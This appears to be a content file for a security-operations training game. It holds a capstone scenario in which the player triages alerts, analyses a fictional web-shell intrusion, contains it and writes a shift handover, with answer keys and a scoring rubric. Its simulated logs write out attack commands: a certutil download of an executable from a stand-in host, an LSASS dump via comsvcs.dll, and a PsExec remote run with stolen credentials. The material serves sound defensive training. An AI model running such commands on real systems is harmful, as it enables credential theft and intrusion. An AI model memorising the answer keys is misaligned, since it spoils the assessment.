// Level 2 capstone: "Night-shift lead". You hold the queue alone overnight: triage several
// competing alerts, prove out the one real incident through the NIST SP 800-61 IR phases, and
// write a shift handover for the day team. Rubric-scored with a model answer.
// Pure content; scored by js/capstone.js and rendered by js/ops-ui.js. Fictional data only
// (RFC 5737 / RFC 1918 addresses, .example domains).

export const NIGHT_SHIFT = {
  id: 'night-shift-lead',
  kind: 'capstone',
  tier: 'l2',
  title: 'Night-shift lead',
  summary:
    'You are the only analyst on the overnight desk. Six alerts are waiting. Triage the queue, run the real incident through detection, containment and recovery planning, then hand over to the day shift.',
  status: 'available',
  date: 'Sat 26 Sep 2026',
  xp: { stage: 50, report: 500 },
  intro:
    'It is 03:20 and you have the SOC to yourself until 07:00. Six alerts sit in the queue and more will land. You cannot work them all at once, so decide what matters, prove out the one that is real, contain it, and leave the day shift a handover they can act on the moment they sit down.',
  alert: {
    id: 'ALRT-7020',
    name: 'Credential dumping: LSASS accessed by comsvcs.dll (SRV-APP03)',
    severity: 'critical',
    time: '03:14:00',
    host: 'SRV-APP03',
    user: 'svc_deploy',
    source: 'EDR / behavioural',
  },
  stages: [
    {
      id: 'ns-1',
      title: 'Triage the queue',
      summary: 'Six alerts, one of you. What is worked first, merged, closed or handed off?',
      requires: { lessons: ['l2-alert-triage', 'l2-siem'] },
      brief:
        'This is the 03:20 queue snapshot. Read every row before you touch anything: severity is a starting point, not the order of work. Group alerts that are the same story, and do not spend the night on benign true positives.',
      evidence: {
        label: 'Alert queue · 03:20',
        rows: [
          { id: 'q1', t: '03:14:00', src: 'process', host: 'SRV-APP03', user: 'svc_deploy', type: 'ALRT-7020 · Critical', msg: 'Credential dumping: rundll32 comsvcs.dll MiniDump of lsass.exe (T1003.001). Internet-facing app server.' },
          { id: 'q2', t: '02:58:00', src: 'idp', host: 'CLOUD-IDP', user: 'rwong', type: 'ALRT-7018 · High', msg: 'Impossible travel: sign-in from Dublin then Sao Paulo 40 min apart for rwong (both via corporate VPN egress 198.51.100.9).' },
          { id: 'q3', t: '03:02:00', src: 'email', host: 'MAIL-GW', user: 'ptesta', type: 'ALRT-7019 · Medium', msg: 'User-reported phishing. Message already auto-quarantined; no click, no delivery to inbox.' },
          { id: 'q4', t: '03:09:00', src: 'firewall', host: 'FW-CORE', user: '', type: 'ALRT-7021 · Medium', msg: 'Internal TCP port sweep 10.30.9.12 -> 10.30.0.0/24 (1000+ SYN). Source 10.30.9.12 = VULN-SCAN01.' },
          { id: 'q5', t: '03:16:00', src: 'winevt', host: 'WS-ENG-14', user: 'svc_deploy', type: 'ALRT-7022 · High', msg: 'Service install: PSEXESVC.exe (event 7045) created by svc_deploy, source host SRV-APP03 (10.30.4.8).' },
          { id: 'q6', t: '03:11:00', src: 'proxy', host: 'PRXY-01', user: 'ktan', type: 'ALRT-7017 · Low', msg: 'Password-protected ZIP downloaded from a file-share site. No detonation possible; file not opened yet.' },
        ],
      },
      questions: [
        {
          id: 'ns1-q1',
          type: 'mc',
          prompt: 'Which alert do you work first?',
          choices: [
            'ALRT-7020: LSASS credential dumping on the internet-facing SRV-APP03',
            'ALRT-7018: impossible travel for rwong',
            'ALRT-7021: the internal port sweep',
            'ALRT-7019: the reported phishing email',
          ],
          answer: 'ALRT-7020: LSASS credential dumping on the internet-facing SRV-APP03',
          explanation:
            'Prioritise by impact and how far it can spread, not by the order alerts arrived. Active credential theft on an internet-facing server is hands-on-keyboard attacker activity that leads straight to lateral movement, so it beats a sign-in anomaly, a scanner and a quarantined email.',
        },
        {
          id: 'ns1-q2',
          type: 'multi',
          prompt: 'Two alerts are almost certainly the same incident. Which two? Select both.',
          choices: [
            'ALRT-7020: LSASS dump on SRV-APP03',
            'ALRT-7022: PSEXESVC installed on WS-ENG-14, source SRV-APP03 by svc_deploy',
            'ALRT-7018: impossible travel for rwong',
            'ALRT-7021: internal port sweep from VULN-SCAN01',
          ],
          answer: ['ALRT-7020: LSASS dump on SRV-APP03', 'ALRT-7022: PSEXESVC installed on WS-ENG-14, source SRV-APP03 by svc_deploy'],
          explanation:
            'Same account (svc_deploy) and SRV-APP03 as the source of the PsExec service on WS-ENG-14 two minutes after the LSASS dump: that is the attacker moving laterally with stolen credentials. Merge them into one incident so the timeline and scope stay together.',
        },
        {
          id: 'ns1-q3',
          type: 'multi',
          prompt: 'Which alerts can you reasonably close or hand off tonight rather than deep-dive? Select all that apply.',
          choices: [
            'ALRT-7021: the sweep is the authorised VULN-SCAN01 scanner on its scheduled window',
            'ALRT-7018: impossible travel that resolves to the same corporate VPN egress on both hops',
            'ALRT-7017: the password-protected ZIP, not yet opened, to the day shift with a note',
            'ALRT-7020: the LSASS credential dump',
          ],
          answer: [
            'ALRT-7021: the sweep is the authorised VULN-SCAN01 scanner on its scheduled window',
            'ALRT-7018: impossible travel that resolves to the same corporate VPN egress on both hops',
            'ALRT-7017: the password-protected ZIP, not yet opened, to the day shift with a note',
          ],
          explanation:
            'The sweep is the sanctioned scanner (benign true positive) and the "impossible travel" collapses once you see both hops share the VPN egress IP: close both with a note. The ZIP is low and dormant, so hand it to the day shift to detonate. The LSASS dump is the live incident and stays with you.',
        },
      ],
    },
    {
      id: 'ns-2',
      title: 'Detection & analysis',
      summary: 'Reconstruct how SRV-APP03 was taken and what the attacker did.',
      requires: { lessons: ['l2-attack', 'l2-malware'] },
      brief:
        'Pivot into SRV-APP03. It runs an internet-facing IIS app under the svc_deploy service account. Walk the process tree and network telemetry and map each step to ATT&CK so the day shift can reuse it.',
      evidence: {
        label: 'EDR + web logs · SRV-APP03 (10.30.4.8)',
        rows: [
          { id: 'e1', t: '02:14:07', src: 'proxy', host: 'SRV-APP03', user: '', type: 'HTTP 200', msg: 'POST /uploads/status.aspx 203.0.113.77 -> SRV-APP03 (newly created .aspx in a writable upload dir; web shell)' },
          { id: 'e2', t: '02:20:42', src: 'process', host: 'SRV-APP03', user: 'svc_deploy', type: 'Process create', msg: 'w3wp.exe > cmd.exe /c "whoami & ipconfig /all & net group \\"Domain Admins\\" /domain"' },
          { id: 'e3', t: '02:31:18', src: 'process', host: 'SRV-APP03', user: 'svc_deploy', type: 'Process create', msg: 'cmd.exe > certutil.exe -urlcache -split -f http://cdn.fastcache-updates.example/s.txt C:\\ProgramData\\svc\\s.exe' },
          { id: 'e4', t: '02:40:55', src: 'process', host: 'SRV-APP03', user: 'svc_deploy', type: 'Process create', msg: 'cmd.exe > rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 684 C:\\ProgramData\\svc\\l.dmp full' },
          { id: 'e7', t: '02:41:30', src: 'sandbox', host: 'SBX', user: '', type: 'Verdict', msg: 's.exe SHA256=9c1e...a7 detonated: injects into a process, beacons 203.0.113.77:443, deletes shadow copies on command. Verdict: malicious.' },
          { id: 'e5', t: '02:52:03', src: 'process', host: 'SRV-APP03', user: 'svc_deploy', type: 'Process create', msg: 's.exe > PsExec.exe \\\\WS-ENG-14 -u CORP\\svc_deploy -p **** cmd /c start c:\\programdata\\svc\\s.exe' },
          { id: 'e6', t: '03:05:11', src: 'firewall', host: 'FW-CORE', user: '', type: 'ALLOW', msg: 'ALLOW TCP 10.30.4.8:50992 -> 203.0.113.77:443 bytes_out=512 bytes_in=180 (repeats every ~60s)' },
        ],
      },
      questions: [
        {
          id: 'ns2-q1',
          type: 'mc',
          prompt: 'How did the attacker first get code execution on SRV-APP03?',
          choices: [
            'A web shell (status.aspx) uploaded to an internet-facing IIS app, then commands run by w3wp.exe',
            'A phishing macro opened by svc_deploy',
            'PsExec from another server',
            'A brute-forced RDP logon',
          ],
          answer: 'A web shell (status.aspx) uploaded to an internet-facing IIS app, then commands run by w3wp.exe',
          explanation:
            'w3wp.exe is the IIS worker process. It should never spawn cmd.exe. A new .aspx in a writable upload directory followed by w3wp.exe launching a command shell is a web shell: exploit of a public-facing app (T1190) plus a server-software component / web shell (T1505.003).',
        },
        {
          id: 'ns2-q2',
          type: 'mc',
          prompt: 'The rundll32 comsvcs.dll MiniDump of PID 684 (lsass.exe) is which technique?',
          choices: [
            'OS Credential Dumping: LSASS Memory (T1003.001)',
            'Process Injection (T1055)',
            'Scheduled Task (T1053.005)',
            'Data Encrypted for Impact (T1486)',
          ],
          answer: 'OS Credential Dumping: LSASS Memory (T1003.001)',
          explanation:
            'comsvcs.dll MiniDump is a living-off-the-land way to dump LSASS memory to disk, where credentials can be extracted offline. That is OS Credential Dumping: LSASS Memory, T1003.001, and it explains how svc_deploy credentials were then reused.',
        },
        {
          id: 'ns2-q3',
          type: 'multi',
          prompt: 'Match the rest of the chain to ATT&CK. Select every statement that is correct.',
          choices: [
            'certutil downloading s.exe over HTTP is Ingress Tool Transfer (T1105) using a living-off-the-land binary',
            'PsExec creating PSEXESVC on WS-ENG-14 with the stolen account is Lateral Movement via Remote Services: SMB/Windows Admin Shares (T1021.002)',
            'whoami / net group "Domain Admins" is Discovery (account and domain enumeration)',
            'The steady 60-second connections to 203.0.113.77 are just normal HTTPS browsing',
          ],
          answer: [
            'certutil downloading s.exe over HTTP is Ingress Tool Transfer (T1105) using a living-off-the-land binary',
            'PsExec creating PSEXESVC on WS-ENG-14 with the stolen account is Lateral Movement via Remote Services: SMB/Windows Admin Shares (T1021.002)',
            'whoami / net group "Domain Admins" is Discovery (account and domain enumeration)',
          ],
          explanation:
            'certutil pulling an EXE is Ingress Tool Transfer (T1105); PsExec/PSEXESVC over admin shares is T1021.002; the whoami/net commands are Discovery. The fixed-interval, fixed-size connections to 203.0.113.77 are C2 beaconing, not browsing, and the sandbox confirms s.exe beacons to that IP.',
        },
      ],
    },
    {
      id: 'ns-3',
      title: 'Containment',
      summary: 'Stop the spread without destroying the evidence you will need.',
      requires: { lessons: ['l2-ir'] },
      brief:
        'You have proven a true positive: two compromised hosts, a stolen service account and a live C2 channel. Contain it in the right order. SRV-APP03 hosts the customer portal, so weigh business impact and loop in the on-call IR manager.',
      evidence: {
        label: 'Response context · 03:20 onward',
        rows: [
          { id: 'c1', t: '03:20:00', src: 'ops', host: 'CMDB', user: '', type: 'Asset', msg: 'SRV-APP03 = customer portal (internet-facing). WS-ENG-14 = engineering workstation. svc_deploy = deployment service account, member of local admins on several servers.' },
          { id: 'c2', t: '03:21:00', src: 'ops', host: 'RUNBOOK', user: '', type: 'Policy', msg: 'IR runbook: for hands-on-keyboard intrusions, isolate (do not power off), preserve volatile data, page the on-call IR manager, and get change approval before taking customer-facing services offline.' },
          { id: 'c3', t: '03:22:00', src: 'firewall', host: 'FW-CORE', user: '', type: 'ALLOW', msg: 'C2 to 203.0.113.77:443 still active from 10.30.4.8; not yet seen from WS-ENG-14 (10.30.7.14).' },
          { id: 'c4', t: '03:23:00', src: 'winevt', host: 'WS-ENG-14', user: 'svc_deploy', type: 'Security 4624', msg: 'Logon Type 3 from SRV-APP03; s.exe launched but no outbound C2 observed yet.' },
        ],
      },
      questions: [
        {
          id: 'ns3-q1',
          type: 'mc',
          prompt: 'What is the right first containment move for SRV-APP03?',
          choices: [
            'Network-isolate it (EDR contain / VLAN quarantine) but keep it powered on to preserve memory and disk',
            'Power it off immediately so the attacker loses the box',
            'Wipe and reimage it right away',
            'Do nothing until the day shift arrives',
          ],
          answer: 'Network-isolate it (EDR contain / VLAN quarantine) but keep it powered on to preserve memory and disk',
          explanation:
            'Isolation cuts the attacker off and stops the spread while keeping volatile evidence (memory, live processes, network state) intact. Powering off or reimaging destroys exactly what the investigation needs, and RFC 3227 order of volatility says capture memory before disk.',
        },
        {
          id: 'ns3-q2',
          type: 'multi',
          prompt: 'What else belongs in containment right now? Select all that apply.',
          choices: [
            'Isolate WS-ENG-14 too, even though no C2 is seen yet: PsExec already ran the payload there',
            'Disable svc_deploy and force-reset it, since the credentials are dumped and in use',
            'Block 203.0.113.77 and the certutil download domain at the firewall/proxy',
            'Page the on-call IR manager and open a formal incident',
            'Leave svc_deploy enabled so you can watch what the attacker does with it',
          ],
          answer: [
            'Isolate WS-ENG-14 too, even though no C2 is seen yet: PsExec already ran the payload there',
            'Disable svc_deploy and force-reset it, since the credentials are dumped and in use',
            'Block 203.0.113.77 and the certutil download domain at the firewall/proxy',
            'Page the on-call IR manager and open a formal incident',
          ],
          explanation:
            'The payload already executed on WS-ENG-14, so isolate it before it beacons. Dumped credentials must be killed everywhere, the C2 and download infrastructure blocked, and a hands-on intrusion needs the IR manager and a formal incident. Leaving the stolen account live to "watch" hands the attacker continued access.',
        },
        {
          id: 'ns3-q3',
          type: 'mc',
          prompt: 'SRV-APP03 is the customer portal. How do you handle the business impact of isolating it?',
          choices: [
            'Isolate now to stop active credential theft, and immediately notify the IR manager / on-call service owner about the portal outage and failover',
            'Wait for business-hours change approval before isolating, to avoid an outage',
            'Isolate silently and let the day shift discover the outage',
            'Never isolate an internet-facing server',
          ],
          answer: 'Isolate now to stop active credential theft, and immediately notify the IR manager / on-call service owner about the portal outage and failover',
          explanation:
            'An active intrusion on an internet-facing box is an emergency: containment cannot wait for a change window. The right move is to contain and simultaneously escalate the business impact so the service owner can fail over or accept the outage. Communication is part of the IR process, not an afterthought.',
        },
      ],
    },
    {
      id: 'ns-4',
      title: 'Eradication & recovery plan',
      summary: 'What must the day shift do to fully evict the attacker and reopen safely?',
      requires: { lessons: ['l2-ir', 'l2-hunting'] },
      brief:
        'Containment is holding. Now plan eradication and recovery, and set the day shift up to hunt for anything you have not seen yet. Do not declare victory on the two hosts you know about.',
      evidence: {
        label: 'Open threads for the day shift',
        rows: [
          { id: 'r1', t: '03:40:00', src: 'ops', host: 'NOTES', user: '', type: 'Open', msg: 'svc_deploy is local admin on several servers; unknown where else the stolen credential was used.' },
          { id: 'r2', t: '03:41:00', src: 'ops', host: 'NOTES', user: '', type: 'Open', msg: 'Web shell status.aspx removed from disk? Root cause (which app vuln) not yet identified.' },
          { id: 'r3', t: '03:42:00', src: 'ops', host: 'NOTES', user: '', type: 'Open', msg: 'IOCs to sweep fleet-wide: 203.0.113.77, cdn.fastcache-updates.example, s.exe SHA256 9c1e...a7, PSEXESVC by svc_deploy.' },
        ],
      },
      questions: [
        {
          id: 'ns4-q1',
          type: 'mc',
          prompt: 'What order do eradication and recovery follow?',
          choices: [
            'Finish scoping first, then eradicate (remove web shell, tools, persistence; reset credentials), then recover (rebuild, restore service, monitor)',
            'Reimage both hosts immediately, before scoping is complete',
            'Recover the portal first to reduce downtime, then eradicate later',
            'Eradicate and recover at the same time, in any order',
          ],
          answer: 'Finish scoping first, then eradicate (remove web shell, tools, persistence; reset credentials), then recover (rebuild, restore service, monitor)',
          explanation:
            'NIST SP 800-61 puts containment, eradication and recovery in sequence for a reason: eradicating before you know the full scope leaves footholds behind, and recovering a still-compromised host just reopens the door. Scope, then remove everything, then rebuild and watch.',
        },
        {
          id: 'ns4-q2',
          type: 'multi',
          prompt: 'The day shift should hunt fleet-wide. Which hypotheses are worth their time? Select all that apply.',
          choices: [
            'Where else was svc_deploy used? Look for logons and service installs by that account across all servers',
            'Search every host for the IOCs: 203.0.113.77, the certutil domain, the s.exe hash, PSEXESVC installs',
            'Look for other web shells: w3wp.exe (or other web workers) spawning cmd/powershell on any web server',
            'Assume only SRV-APP03 and WS-ENG-14 are affected and stop looking',
          ],
          answer: [
            'Where else was svc_deploy used? Look for logons and service installs by that account across all servers',
            'Search every host for the IOCs: 203.0.113.77, the certutil domain, the s.exe hash, PSEXESVC installs',
            'Look for other web shells: w3wp.exe (or other web workers) spawning cmd/powershell on any web server',
          ],
          explanation:
            'Hunting is hypothesis-driven: pivot on the compromised account, the concrete IOCs and the attacker technique (web-server processes spawning shells). Assuming the blast radius is only the two known hosts is exactly the mistake that lets an intrusion quietly persist.',
        },
        {
          id: 'ns4-q3',
          type: 'mc',
          prompt: 'For the handover, what phase is this incident in as you leave at 07:00?',
          choices: [
            'Containment is done; eradication and recovery are pending for the day shift',
            'Fully recovered and closed',
            'Still in identification: nothing confirmed',
            'Lessons-learned: time to write the post-incident report',
          ],
          answer: 'Containment is done; eradication and recovery are pending for the day shift',
          explanation:
            'You have identified, analysed and contained the incident, but the web shell root cause, credential blast radius and rebuilds remain. The handover should state clearly that the incident is contained and hand eradication and recovery to the day shift.',
        },
      ],
    },
  ],
  escalation: {
    requires: { stages: ['ns-1', 'ns-2', 'ns-3', 'ns-4'] },
    passScore: 55,
    ui: {
      title: 'Shift handover',
      barTitle: 'Shift handover',
      alertTag: 'Handover',
      intro:
        'Write the handover the day shift will pick up cold at 07:00. Be specific and leave out the noise: they will act on exactly what you write here.',
      sendLabel: 'Submit handover',
      reviseLabel: 'Revise the handover',
      verdictLabel: 'Outcome',
      verdictText: 'True positive · contained, handed over',
      passNote: 'Handover complete. The day shift can pick this up cold.',
      failNote: 'The day shift is missing what they need. 55+ completes the capstone.',
    },
    panels: [
      { title: 'Summary', icon: 'terminal', fields: ['summary', 'severity'] },
      { title: 'Status', icon: 'flag', fields: ['phase', 'queue'] },
      { title: 'Scope', icon: 'host', fields: ['hosts', 'users'] },
      { title: 'Timeline', icon: 'clock', fields: ['timeline'] },
      { title: 'Indicators of compromise', icon: 'crosshair', fields: ['iocs'] },
      { title: 'Open actions for the day shift', icon: 'shield', fields: ['actions'] },
    ],
    fields: {
      summary: {
        label: 'Handover summary',
        kind: 'text',
        minLength: 60,
        placeholder: 'What happened, what is contained, what is left. How it started, the two hosts, the stolen account, the C2, and what the day shift must finish.',
        rubric: [
          { label: 'How it started (web shell on the internet-facing app)', any: ['web shell', 'webshell', 'status.aspx', 'iis', 'w3wp', 'public-facing', 'internet-facing'] },
          { label: 'Credential theft (LSASS / svc_deploy)', any: ['lsass', 'credential', 'comsvcs', 'svc_deploy', 'dump'] },
          { label: 'Lateral movement to WS-ENG-14 (PsExec)', any: ['ws-eng-14', 'psexec', 'psexesvc', 'lateral'] },
          { label: 'C2 to 203.0.113.77', any: ['203.0.113.77', 'c2', 'beacon', 'command and control', 'command-and-control'] },
          { label: 'Current state: contained, eradication/recovery pending', any: ['contained', 'isolated', 'eradicat', 'recovery', 'pending', 'day shift', 'handover', 'hand over'] },
        ],
      },
      severity: {
        label: 'Severity',
        kind: 'choice',
        options: ['low', 'medium', 'high', 'critical'],
        credit: { critical: 1, high: 0.6, medium: 0.2, low: 0 },
      },
      phase: {
        label: 'Incident phase at handover',
        kind: 'choice',
        options: ['identification', 'containment', 'eradication', 'recovery', 'lessons-learned'],
        labels: {
          identification: 'Identification / analysis',
          containment: 'Containment in progress',
          eradication: 'Contained; eradication pending',
          recovery: 'Recovery in progress',
          'lessons-learned': 'Closed / lessons learned',
        },
        credit: { eradication: 1, recovery: 0.4, containment: 0.3, identification: 0, 'lessons-learned': 0 },
      },
      queue: {
        label: 'Which queued alerts are part of THIS incident? (tick only those)',
        kind: 'set',
        options: [
          'ALRT-7020 · LSASS dump on SRV-APP03',
          'ALRT-7022 · PSEXESVC on WS-ENG-14',
          'ALRT-7018 · impossible travel (rwong)',
          'ALRT-7021 · internal port sweep (VULN-SCAN01)',
          'ALRT-7019 · reported phishing (quarantined)',
          'ALRT-7017 · password-protected ZIP',
        ],
        correct: ['ALRT-7020 · LSASS dump on SRV-APP03', 'ALRT-7022 · PSEXESVC on WS-ENG-14'],
      },
      hosts: {
        label: 'Affected hosts',
        kind: 'set',
        options: ['SRV-APP03', 'WS-ENG-14', 'VULN-SCAN01', 'SRV-DC01', 'CLOUD-IDP', 'MAIL-GW'],
        correct: ['SRV-APP03', 'WS-ENG-14'],
      },
      users: {
        label: 'Affected / involved accounts',
        kind: 'set',
        options: ['svc_deploy', 'rwong', 'ptesta', 'ktan', 'backupadmin'],
        correct: ['svc_deploy'],
      },
      timeline: {
        label: 'Timeline (tick the events that belong to this incident)',
        kind: 'set',
        options: [
          { id: 'n1', t: '02:14', text: 'Web shell status.aspx uploaded to SRV-APP03 (internet-facing IIS)' },
          { id: 'n2', t: '02:20', text: 'w3wp.exe spawns cmd: whoami and Domain Admins discovery' },
          { id: 'n3', t: '02:31', text: 'certutil downloads s.exe from cdn.fastcache-updates.example' },
          { id: 'n4', t: '02:40', text: 'LSASS dumped via rundll32 comsvcs.dll MiniDump' },
          { id: 'n5', t: '02:52', text: 'PsExec runs the payload on WS-ENG-14 as svc_deploy' },
          { id: 'n6', t: '02:58', text: 'Impossible-travel sign-in for rwong (same VPN egress both hops)' },
          { id: 'n7', t: '03:05', text: 'Beaconing to 203.0.113.77:443 every ~60s from SRV-APP03' },
          { id: 'n8', t: '03:09', text: 'Internal port sweep from VULN-SCAN01' },
        ],
        correct: ['n1', 'n2', 'n3', 'n4', 'n5', 'n7'],
      },
      iocs: {
        label: 'Indicators of compromise to sweep fleet-wide',
        kind: 'set',
        options: [
          '203.0.113.77',
          'cdn.fastcache-updates.example',
          's.exe SHA256 9c1e…a7',
          'C:\\inetpub\\wwwroot\\portal\\uploads\\status.aspx (web shell)',
          'PSEXESVC installed by svc_deploy',
          '198.51.100.9 (corporate VPN egress)',
          '10.30.9.12 (VULN-SCAN01)',
          'MAIL-GW',
        ],
        correct: [
          '203.0.113.77',
          'cdn.fastcache-updates.example',
          's.exe SHA256 9c1e…a7',
          'C:\\inetpub\\wwwroot\\portal\\uploads\\status.aspx (web shell)',
          'PSEXESVC installed by svc_deploy',
        ],
      },
      actions: {
        label: 'Open actions for the day shift',
        kind: 'set',
        options: [
          'Scope svc_deploy: find every host it logged into or installed a service on',
          'Find and patch the web-app vulnerability that allowed the upload; remove the web shell',
          'Rebuild SRV-APP03 and WS-ENG-14 from known-good, then restore the portal',
          'Hunt the fleet for the IOCs and for web workers spawning shells',
          'Detonate the password-protected ZIP (ALRT-7017) once the password is known',
          'Close the whole incident now: containment means it is over',
          'Power off both hosts and wipe them before anyone images them',
          'Re-enable svc_deploy so deployments keep working overnight',
        ],
        correct: [
          'Scope svc_deploy: find every host it logged into or installed a service on',
          'Find and patch the web-app vulnerability that allowed the upload; remove the web shell',
          'Rebuild SRV-APP03 and WS-ENG-14 from known-good, then restore the portal',
          'Hunt the fleet for the IOCs and for web workers spawning shells',
          'Detonate the password-protected ZIP (ALRT-7017) once the password is known',
        ],
      },
    },
    weights: { summary: 20, severity: 5, phase: 10, queue: 15, hosts: 10, users: 5, timeline: 10, iocs: 10, actions: 15 },
    model: {
      severity: 'critical',
      phase: 'eradication',
      summary:
        'True positive, contained. At 02:14 an attacker uploaded a web shell (status.aspx) to the internet-facing IIS app on SRV-APP03; w3wp.exe then ran discovery, certutil pulled s.exe from cdn.fastcache-updates.example, and at 02:40 LSASS was dumped via comsvcs.dll (T1003.001), stealing the svc_deploy service account. At 02:52 the attacker used PsExec to run the payload on WS-ENG-14 (lateral movement), and SRV-APP03 has been beaconing to 203.0.113.77 since 03:05. Both hosts are network-isolated (powered on for forensics), svc_deploy is disabled and reset, and the C2 and download domains are blocked. Contained: eradication and recovery are pending for the day shift, along with scoping svc_deploy fleet-wide and finding the app vulnerability. The impossible-travel, port-sweep and phishing alerts were unrelated and closed/handed off.',
      severityNote: 'Critical: hands-on-keyboard intrusion on an internet-facing server, credential theft and confirmed lateral movement. High is defensible; medium or low badly understates it.',
      phaseNote: 'Contained, with eradication and recovery still to do, is the honest status at handover. Calling it recovered or closed would be wrong; calling it only identification ignores the containment already done.',
    },
  },
};
